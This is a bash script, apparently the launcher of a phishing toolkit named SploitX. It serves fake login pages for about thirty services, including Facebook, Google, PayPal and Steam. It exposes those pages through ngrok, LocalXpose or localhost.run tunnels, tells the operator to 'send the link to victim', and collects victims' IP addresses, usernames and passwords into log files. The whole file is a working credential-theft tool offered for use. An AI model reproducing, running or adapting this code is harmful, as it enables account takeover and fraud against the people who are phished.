# !/bin/bash
# Created by MrHacker-X (Alex)
# https://github.com/MrHacker-X/SploitX.git/

trap 'printf "\n";stop;exit 1' 2
trap user_interrupt SIGINT
trap user_interrupt SIGTSTP

user_interrupt(){
	echo -e '\n\033[1;91mExiting...\033[1;92m'
        sleep 1
        exit 1
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e .nexlink ]]; then
rm -rf .nexlink
fi

}

reqs() {

command -v php > /dev/null 2>&1 || { echo -e "\n\033[1;93mSome packages are not Installed ! type \033[1;91m\033[1;47mbash setup\033[0m \033[1;93mand press ENTER\033[1;92m\n"; exit 1; }
command -v curl > /dev/null 2>&1 || { echo -e "\n\033[1;93mSome packages are not Installed ! type \033[1;91m\033[1;47mbash setup\033[0m \033[1;93mand press ENTER\033[1;92m\n"; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo -e "\n\033[1;93mSome packages are not Installed ! type \033[1;91m\033[1;47mbash setup\033[0m \033[1;93mand press ENTER\033[1;92m\n"; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo -e "\n\033[1;93mSome packages are not Installed ! type \033[1;91m\033[1;47mbash setup\033[0m \033[1;93mand press ENTER\033[1;92m\n"; exit 1; }

if [[ -d .alex ]]; then
printf ""
else
printf "\n\033[1;93mSome packages are not Installed ! type \033[1;91m\033[1;47mbash setup\033[0m \033[1;93mand press ENTER\033[1;92m\n"
exit 1 
fi

if [[ -d .Modules ]]; then
printf ""
else
printf "\n\033[1;93mSome packages are not Installed ! type \033[1;91m\033[1;47mbash setup\033[0m \033[1;93mand press ENTER\033[1;92m\n"
exit 1 
fi

if [[ -d .alex/www ]]; then
rm -rf .alex/www
mkdir .alex/www
else
mkdir .alex/www
fi

}

banner() {

clear
echo "███████╗██████╗ ██╗      ██████╗ ██╗████████╗██╗  ██╗
██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝╚██╗██╔╝
███████╗██████╔╝██║     ██║   ██║██║   ██║    ╚███╔╝
╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║    ██╔██╗
███████║██║     ███████╗╚██████╔╝██║   ██║   ██╔╝ ██╗
╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ╚═╝  ╚═╝" | lolcat

echo -e "        \033[1;97m\033[1;41m Created by >> MrHacker-X \033[0m\033[1;91m\033[1;47m V_1.21.0 \033[0m    "

}

smallbanner() {

clear
echo "╔══════╗╔═════╗ ╔═╗      ╔═════╗ ╔═╗╔═══════╗╔═╗  ╔═╗
║ ╔════╝║ ╔══╗╚╗║ ║     ╔╝╔═══╗╚╗║ ║╚══╗ ╔══╝╚╗╚╗╔╝╔╝
║ ╚════╗║ ╚══╝╔╝║ ║     ║ ║   ║ ║║ ║   ║ ║    ╚╗╚╝╔╝
╚════╗ ║║ ╔═══╝ ║ ║     ║ ║   ║ ║║ ║   ║ ║    ╔╝╔╗╚╗
╔════╝ ║║ ║     ║ ╚════╗╚╗╚═══╝╔╝║ ║   ║ ║   ╔╝╔╝╚╗╚╗
╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ╚═╝  ╚═╝" | lolcat
echo -e "        \033[1;97m\033[1;41m Created by >> MrHacker-X \033[0m\033[1;91m\033[1;47m V_1.21.0 \033[0m    "


}

menu() {

echo -e "        \033[1;91m\033[1;47m Select any attack for you\033[1;97m\033[1;41mr victim  \033[0m\n"
echo -e "\033[1;91m[\033[1;97m01\033[1;91m] \033[1;92mFacebook    \033[1;91m[\033[1;97m11\033[1;91m] \033[1;92mTwitch      \033[1;91m[\033[1;97m21\033[1;91m]\033[1;92m DeviantArt
\033[1;91m[\033[1;97m02\033[1;91m] \033[1;92mInstagram   \033[1;91m[\033[1;97m12\033[1;91m] \033[1;92mPinterest   \033[1;91m[\033[1;97m22\033[1;91m]\033[1;92m Badoo
\033[1;91m[\033[1;97m03\033[1;91m] \033[1;92mGoogle      \033[1;91m[\033[1;97m13\033[1;91m] \033[1;92mSnapchat    \033[1;91m[\033[1;97m23\033[1;91m]\033[1;92m Origin
\033[1;91m[\033[1;97m04\033[1;91m] \033[1;92mMicrosoft   \033[1;91m[\033[1;97m14\033[1;91m] \033[1;92mLinkedin    \033[1;91m[\033[1;97m24\033[1;91m]\033[1;92m CryptoCoin
\033[1;91m[\033[1;97m05\033[1;91m] \033[1;92mNetflix     \033[1;91m[\033[1;97m15\033[1;91m] \033[1;92mEbay        \033[1;91m[\033[1;97m25\033[1;91m] \033[1;92mYahoo
\033[1;91m[\033[1;97m06\033[1;91m] \033[1;92mPaypal      \033[1;91m[\033[1;97m16\033[1;91m] \033[1;92mDropbox     \033[1;91m[\033[1;97m26\033[1;91m] \033[1;92mWordpress
\033[1;91m[\033[1;97m07\033[1;91m] \033[1;92mSteam       \033[1;91m[\033[1;97m17\033[1;91m] \033[1;92mProtonmail  \033[1;91m[\033[1;97m27\033[1;91m] \033[1;92mYandex
\033[1;91m[\033[1;97m08\033[1;91m] \033[1;92mTwitter     \033[1;91m[\033[1;97m18\033[1;91m] \033[1;92mSpotify     \033[1;91m[\033[1;97m28\033[1;91m] \033[1;92mStackoverFlow
\033[1;91m[\033[1;97m09\033[1;91m] \033[1;92mPlaystation \033[1;91m[\033[1;97m19\033[1;91m] \033[1;92mReddit      \033[1;91m[\033[1;97m29\033[1;91m] \033[1;92mVk
\033[1;91m[\033[1;97m10\033[1;91m] \033[1;92mGithub      \033[1;91m[\033[1;97m20\033[1;91m] \033[1;92mAdobe       \033[1;91m[\033[1;97m30\033[1;91m] \033[1;92mXBOX
\033[1;91m[\033[1;97m95\033[1;91m]\033[1;93m About
\033[1;91m[\033[1;97m99\033[1;91m] Exit"
printf "\e[0m\n"
read -p $'\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Select any option: \e[0m\e[1;92m\en' menu_option

if [[ $menu_option == 1 || $menu_option == 01 ]]; then
facebook
elif [[ $menu_option == 2 || $menu_option == 02 ]]; then
instagram
elif [[ $menu_option == 3 || $menu_option == 03 ]]; then
gmail
elif [[ $menu_option == 4 || $menu_option == 04 ]]; then
website="microsoft"
tunnel_menu
elif [[ $menu_option == 5 || $menu_option == 05 ]]; then
website="netflix"
tunnel_menu
elif [[ $menu_option == 6 || $menu_option == 06 ]]; then
website="paypal"
tunnel_menu
elif [[ $menu_option == 7 || $menu_option == 07 ]]; then
website="steam"
tunnel_menu
elif [[ $menu_option == 8 || $menu_option == 08 ]]; then
website="twitter"
tunnel_menu
elif [[ $menu_option == 9 || $menu_option == 09 ]]; then
website="playstation"
tunnel_menu
elif [[ $menu_option == 10 ]]; then
website="github"
tunnel_menu
elif [[ $menu_option == 11 ]]; then
website="twitch"
tunnel_menu
elif [[ $menu_option == 12 ]]; then
website="pinterest"
tunnel_menu
elif [[ $menu_option == 13 ]]; then
website="snapchat"
tunnel_menu
elif [[ $menu_option == 14 ]]; then
website="linkedin"
tunnel_menu
elif [[ $menu_option == 15 ]]; then
website="ebay"
tunnel_menu
elif [[ $menu_option == 16 ]]; then
website="dropbox"
tunnel_menu
elif [[ $menu_option == 17 ]]; then
website="protonmail"
tunnel_menu
elif [[ $menu_option == 18 ]]; then
website="spotify"
tunnel_menu
elif [[ $menu_option == 19 ]]; then
website="reddit"
tunnel_menu
elif [[ $menu_option == 20 ]]; then
website="adobe"
tunnel_menu
elif [[ $menu_option == 21 ]]; then
website="deviantart"
tunnel_menu
elif [[ $menu_option == 22 ]]; then
website="badoo"
tunnel_menu
elif [[ $menu_option == 23 ]]; then
website="origin"
tunnel_menu
elif [[ $menu_option == 24 ]]; then
website="cryptocoinsniper"
tunnel_menu
elif [[ $menu_option == 25 ]]; then
website="yahoo"
tunnel_menu
elif [[ $menu_option == 26 ]]; then
website="wordpress"
tunnel_menu
elif [[ $menu_option == 27 ]]; then
website="yandex"
tunnel_menu
elif [[ $menu_option == 28 ]]; then
website="stackoverflow"
tunnel_menu
elif [[ $menu_option == 29 ]]; then
vk
elif [[ $menu_option == 30 ]]; then
website="xbox"
tunnel_menu
elif [[ $menu_option == 95 ]]; then
about
elif [[ $menu_option == 99 || $menu_option == E ]]; then
echo -e '\033[1;91mExiting...\033[1;92m'
sleep 1.0
exit 1

else
echo -e "\033[1;91mInvalid option !\033[1;92m"
sleep 1
banner
menu
fi

}

facebook(){
printf " \n"
printf "\e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;92m Traditional Login Page\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;92m Fake Security Login Page\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;92m Advanced Voting Poll Login Page\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;92m Facebook Messenger Login Page\e[0m\n"
printf "\e[0m\n"
read -p $'\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;92m\en' fb_option


if [[ $fb_option == 1 || $fb_option == 01 ]]; then
website="facebook"
tunnel_menu
elif [[ $fb_option == 3 || $fb_option == 03 ]]; then
website="fb_advanced"
tunnel_menu
elif [[ $fb_option == 2 || $fb_option == 02 ]]; then
website="fb_security"
tunnel_menu
elif [[ $fb_option == 4 || $fb_option == 04 ]]; then
website="fb_messenger"
tunnel_menu

else
echo -e "\033[1;91mInvalid option !\033[1;92m"
sleep 1
banner
menu
fi

}
instagram(){
printf "\n"
printf "\e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;92m Traditional Login Page\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;92m Blue Badge Verify Login Page\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;92m Auto Followers Login Page\e[0m\n"
printf "\e[0m\n"
read -p $'\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;92m\en' ig_option


if [[ $ig_option == 1 || $ig_option == 01 ]]; then
website="instagram"
tunnel_menu
elif [[ $ig_option == 3 || $ig_option == 03 ]]; then
website="ig_followers"
tunnel_menu
elif [[ $ig_option == 2 || $ig_option == 02 ]]; then
website="ig_verify"
tunnel_menu

else
echo -e "\033[1;91mInvalid option !\033[1;92m"
sleep 1
banner
menu
fi

}
gmail(){
printf "\n"
printf "\e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;92m Gmail Old Login Page\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;92m Gmail New Login Page\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;92m Advanced Voting Poll\e[0m\n"
printf "\e[0m\n"
read -p $'\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;92m\en' gmail_option


if [[ $gmail_option == 1 || $gmail_option == 01 ]]; then
website="google"
tunnel_menu
elif [[ $gmail_option == 2 || $gmail_option == 02 ]]; then
website="google_new"
tunnel_menu
elif [[ $gmail_option == 3 || $gmail_option == 03 ]]; then
website="google_poll"
tunnel_menu

else
echo -e "\033[1;91mInvalid option !\033[1;92m"
sleep 1
banner
menu
fi

}
vk(){
printf "\n"
printf "\e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;92m Traditional Login Page\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;92m Advanced Voting Poll Login Page\e[0m\n"
printf "\e[0m\n"
read -p $'\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;92m\en' vk_option


if [[ $vk_option == 1 || $vk_option == 01 ]]; then
website="vk"
tunnel_menu
elif [[ $vk_option == 2 || $vk_option == 02 ]]; then
website="vk_poll"
tunnel_menu

else
echo -e "\033[1;91mInvalid option !\033[1;92m"
sleep 1
banner
menu
fi

}

about() {
clear
echo -e "\033[1;92mProcessing....."
sleep 1.5
clear
echo "███████╗██████╗ ██╗      ██████╗ ██╗████████╗██╗  ██╗
██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝╚██╗██╔╝
███████╗██████╔╝██║     ██║   ██║██║   ██║    ╚███╔╝
╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║    ██╔██╗
███████║██║     ███████╗╚██████╔╝██║   ██║   ██╔╝ ██╗
╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ╚═╝  ╚═╝" | lolcat
sleep 0.2

echo -e "        \033[1;97m\033[1;41m Created by >> MrHacker-X \033[0m\033[1;91m\033[1;47m V_1.21.0 \033[0m    \n"
printf "\033[1;91m* \e[0m\e[92mAuthor \e[0m\e[91m   : \e[0m\e[92mAlex Butler \e[0m\e[91m[\e[0m\e[97mMrHacker-X\e[0m\e[91m]\e[0m\n"
printf "\e[0m\n"
sleep 0.2
printf "\033[1;91m* \e[0m\e[92mGithub \e[0m\e[91m   : \e[0m\e[94mhttps://github.com/MrHacker-X/\e[0m\n"
printf "\e[0m\n"
sleep 0.2
printf "\033[1;91m* \e[0m\e[92mInstagram \e[0m\e[91m: \e[0m\e[94mhttps://instagram.com/mrhacker.x/\e[0m\n"
printf "\e[0m\n"
sleep 0.2
printf "\033[1;91m* \e[0m\e[92mTelegram \e[0m\e[91m : \e[0m\e[94mhttps://t.me/mrhackersx/\e[0m\n"
printf "\e[0m\n"
sleep 0.2
printf "\033[1;91m* \e[0m\e[92mFacebook \e[0m\e[91m : \e[0m\e[94mhttps://facebook.com/hackerxmr/\e[0m\n"
printf "\e[0m\n"
sleep 0.2
printf "\033[1;91m* \e[0m\e[92mYouTube \e[0m\e[91m  : \e[0m\e[94mhttps://youtube.com/c/Sololex/\e[0m\n"
printf "\e[0m\n"
sleep 0.2
printf "\033[1;91m* \e[0m\e[92mVersion \e[0m\e[91m  : \e[0m\e[92m1.21.0\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\n"
sleep 0.2
echo -e "\033[1;91m[\033[1;97m95\033[1;91m]\033[1;92m Main menu"
echo -e "\033[1;91m[\033[1;97m99\033[1;91m]\033[1;92m Exit"
echo
read -p $'\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Select any option: \e[0m\e[1;92m\en' alexx
if [[ $alexx == 95 ]]; then
echo -e "\033[1;94mComing back to main menu"
sleep 1
banner
menu
elif [[ $alexx == 99 ]]; then
echo -e "\033[1;91mExiting.....\033[0m"
sleep 1.5
exit 1

else
echo -e "\033[1;91mInvalid option !\033[1;92m"
sleep 1
banner
menu
fi
}

tunnel_menu() {

if [[ -e .nexlink ]]; then
rm -rf .nexlink
fi

if [[ -d .alex/www ]]; then
rm -rf .alex/www
mkdir .alex/www
else
mkdir .alex/www
fi

cp -rf .Modules/$website/* .alex/www
cp -f .Modules/ip.php .alex/www/

def_tunnel_menu="2"
smallbanner
echo -e "\033[1;91m[\033[1;97m01\033[1;91m]\033[1;92m LocalHost"
echo -e "\033[1;91m[\033[1;97m02\033[1;91m]\033[1;92m Ngrok"
echo -e "\033[1;91m[\033[1;97m03\033[1;91m]\033[1;92m Serveo.net"
echo -e "\033[1;91m[\033[1;97m04\033[1;91m]\033[1;92m LocalXpose"
echo -e "\033[1;91m[\033[1;97m05\033[1;91m]\033[1;92m LocalHostRun"
printf "\e[0m\n"
read -p $'\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;92m\en' tunnel_menu
tunnel_menu="${tunnel_menu:-${def_tunnel_menu}}"

if [[ $tunnel_menu == 1 || $tunnel_menu == 01 ]]; then
start_localhost
elif [[ $tunnel_menu == 2 || $tunnel_menu == 02 ]]; then
start_ngrok
elif [[ $tunnel_menu == 3 || $tunnel_menu == 03 ]]; then
start_serveo
elif [[ $tunnel_menu == 4 || $tunnel_menu == 04 ]]; then
start_loclx
elif [[ $tunnel_menu == 5 || $tunnel_menu == 05 ]]; then
start_localhostrun

else
echo -e "\033[1;91mInvalid option !\033[1;92m"
sleep 1
banner
menu
fi

}

start_localhost() {

printf "\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m( \e[0m\e[1;97mhttp://127.0.0.1:5555 \e[0m\e[1;92m)\e[0m\n"
cd .alex/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
sleep 2
smallbanner
printf "\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Successfully Hosted at :\e[0m\e[1;97m http://127.0.0.1:5555\e[0m\n"

datafound

}

start_ngrok() {

printf "\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;97mhttp://127.0.0.1:5555\e[0m\e[1;91m )\e[0m\n"
sleep 1
printf "\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok ...\e[0m\n"
cd .alex/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
sleep 2
./.alex/ngrok http 127.0.0.1:5555 > /dev/null 2>&1 &
sleep 7
ngrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")

smallbanner
printf "\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Send the link to victim :\e[0m\e[1;94m %s \n" $ngrok_link

datafound
}


start_loclx() {

loclx_default_choose_sub="Y"
loclx_default_sub="$website$RANDOM"

printf "\e[0m\n"
printf '\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Generate Custom Link ? \e[0m\e[1;91m[\e[0m\e[1;92mY\e[0m\e[1;91m/\e[0m\e[1;92mn\e[0m\e[1;91m] : \e[0m\e[1;93m'
read loclx_choose_sub
loclx_choose_sub="${loclx_choose_sub:-${loclx_default_choose_sub}}"
if [[ $loclx_choose_sub == "Y" || $loclx_choose_sub == "y" || $loclx_choose_sub == "Yes" || $loclx_choose_sub == "yes" ]]; then
loclx_custom_subdomain=true
sleep 1
printf "\e[0m\n"
printf '\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Input CUSTOM Subdomain : \e[0m\e[1;91m( \e[0m\e[1;92mDefault:\e[0m\e[1;92m %s \e[0m\e[1;91m )\e[0m\e[1;92m: \e[0m\e[1;93m' $loclx_default_sub
read loclx_subdomain
loclx_subdomain="${loclx_subdomain:-${loclx_default_sub}}"
sleep 1
fi

printf "\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;97mhttp://127.0.0.1:4142\e[0m\e[1;91m )\e[0m\n"
sleep 1
printf "\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalTunnel ...\e[0m\n"
cd .alex/www && php -S 127.0.0.1:4142 > /dev/null 2>&1 & 
if [[ $loclx_custom_subdomain == true ]]; then

./.alex/loclx tunnel http --to :4142 --subdomain $loclx_subdomain > .nexlink 2> /dev/null &

sleep 8

else
./.alex/loclx tunnel http --to :4142 > .nexlink 2> /dev/null &
sleep 8
fi
loclx_link=$(grep -o 'https://[0-9a-z]*\.loclx.io ' .nexlink)
smallbanner
printf "\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Send the link to victim :\e[0m\e[1;97m %s \n" $loclx_link

datafound
}

start_localhostrun() {

printf "\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalHostRun ...\e[0m\n"
cd .alex/www && php -S 127.0.0.1:4545 > /dev/null 2>&1 & 
printf "\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;97mhttp://127.0.0.1:4545\e[0m\e[1;91m )\e[0m\n"
sleep 1
printf "\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Press Ctrl+C to View Login Creds \e[0m\n"
sleep 1
printf "\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m"
ssh -R 80:localhost:4545 ssh.localhost.run

printf "\e[0m\n"

printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m::\e[0m\e[1;31m]\e[0m\e[1;92m Login Info \e[1;31m[\e[0m\e[1;77m::\e[0m\e[1;31m]\e[0m\n"
printf "\e[0m\n"
while [ true ]; do


if [[ -e ".alex/www/ip.txt" ]]; then
printf " \e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found !\e[0m\n"
grab_ip
rm -rf .alex/www/ip.txt
fi
sleep 0.75
if [[ -e ".alex/www/usernames.txt" ]]; then
account=$(grep -o 'Username:.*' .alex/www/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' .alex/www/usernames.txt | cut -d ":" -f2)
printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;97m %s\n\e[0m" $account
printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;97m %s\n\e[0m" $password
cat .alex/www/usernames.txt >> logs/$website.log
printf "\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Saved:\e[0m\e[1;97m logs/%s.log\e[0m\n" $website
printf "\n"
printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Press Ctrl + C to Exit\e[0m\n"
rm -rf .alex/www/usernames.txt
fi
sleep 0.75

done

}

grab_ip() {

ip=$(grep -a 'IP:' .alex/www/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'

printf "\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP:\e[0m\e[1;97m %s\e[0m\n" $ip
printf "\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Saved:\e[0m\e[1;97m ip.txt\e[0m\n" $server
printf "\n"
cat .alex/www/ip.txt >> ip.txt

}

grab_creds() {

account=$(grep -o 'Username:.*' .alex/www/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' .alex/www/usernames.txt | cut -d ":" -f2)
printf "\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;97m %s\n\e[0m" $account
printf "\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;97m %s\n\e[0m" $password
cat .alex/www/usernames.txt >> logs/$website.log
printf "\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Saved:\e[0m\e[1;97m logs/%s.log\e[0m\n" $website
printf "\n"
printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;97m Waiting for Next Login Info,\e[0m\e[1;92m Ctrl + C to exit.\e[0m\n"

}

datafound() {

printf "\n"
printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;97m Waiting for Login Info,\e[0m\e[1;92m Ctrl + C to exit.\e[0m\n"
printf "\n"
while [ true ]; do


if [[ -e ".alex/www/ip.txt" ]]; then
printf "\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found !\e[0m\n"
grab_ip
rm -rf .alex/www/ip.txt
fi
sleep 0.75
if [[ -e ".alex/www/usernames.txt" ]]; then
printf "\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Login info Found !!\e[0m\n"
grab_creds
rm -rf .alex/www/usernames.txt
fi
sleep 0.75


done 

}

banner
reqs
menu
